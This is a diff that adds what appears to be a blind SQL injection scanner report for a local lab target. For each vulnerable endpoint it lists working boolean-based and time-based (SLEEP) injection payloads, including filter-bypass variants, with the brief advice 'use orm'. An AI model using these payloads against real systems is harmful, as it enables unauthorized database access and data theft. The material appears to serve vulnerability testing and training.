@@ -1,0 +1,104 @@
+Target: http://192.168.42.133/ (GET)
+
+---
+URL:http://192.168.42.133/sqli/example1.php 
+VulnName: bsqli
+Query: {'name': "root'\tand\t'3933'='3933"}
+payload: '	and	'3933'='3933
+'	and	'67046'='67046
+'	or	60645=60645#
+'	and	'81437'='81438
+advice: use orm
+---
+---
+URL:http://192.168.42.133/sqli/example2.php 
+VulnName: bsqli
+Query: {'name': "root'\tand\t'3933'='3933"}
+payload: '	and	'3933'='3933
+'	and	'67046'='67046
+'	or	60645=60645#
+'	and	'81437'='81438
+advice: use orm
+---
+---
+URL:http://192.168.42.133/sqli/example3.php 
+VulnName: bsqli
+Query: {'name': "root'/**/and/**/'58591'='58591"}
+payload: '/**/and/**/'58591'='58591
+'/**/and/**/'31905'='31905
+'/**/or/**/72311=72311#
+'/**/and/**/'2826'='2827
+advice: use orm
+---
+---
+URL:http://192.168.42.133/sqli/example4.php 
+VulnName: bsqli
+Query: {'id': '2\tand\t7061=7061'}
+payload: 	and	7061=7061
+	and	61637=61637
+	or	80378=80378#
+	and	11125=11126
+advice: use orm
+---
+---
+URL:http://192.168.42.133/sqli/example5.php 
+VulnName: bsqli
+Query: {'id': '2\tand\t7061=7061'}
+payload: 	and	7061=7061
+	and	61637=61637
+	or	80378=80378#
+	and	11125=11126
+advice: use orm
+---
+---
+URL:http://192.168.42.133/sqli/example6.php 
+VulnName: bsqli
+Query: {'id': "2'+and+'89837'='89837"}
+payload: '+and+'89837'='89837
+'+and+'84990'='84990
+'+or+87857=87857#
+'+and+'53801'='53802
+advice: use orm
+---
+---
+URL:http://192.168.42.133/sqli/example7.php 
+VulnName: bsqli
+Query: {'id': '2\nand\n47024=47024'}
+payload: 
+and
+47024=47024
+
+and
+42157=42157
+
+or
+32096=32096#
+
+and
+14854=14855
+advice: use orm
+---
+---
+URL:http://192.168.42.133/sqli/example8.php 
+VulnName: bsqli
+Query: {'order': 'name'}
+payload: ` or SLEEP(3);-- 
+advice: use orm
+---
+---
+URL:http://192.168.42.133/sqli/example9.php 
+VulnName: bsqli
+Query: {'order': 'name'}
+payload:  or SLEEP(3);-- 
+advice: use orm
+---
+---
+URL:http://192.168.42.133/xml/example2.php 
+VulnName: bsqli
+Query: {'name': "hacker'+and+'89837'='89837"}
+payload: '+and+'89837'='89837
+'+and+'84990'='84990
+'+or+87857=87857#
+'+and+'53801'='53802
+advice: use orm
+---
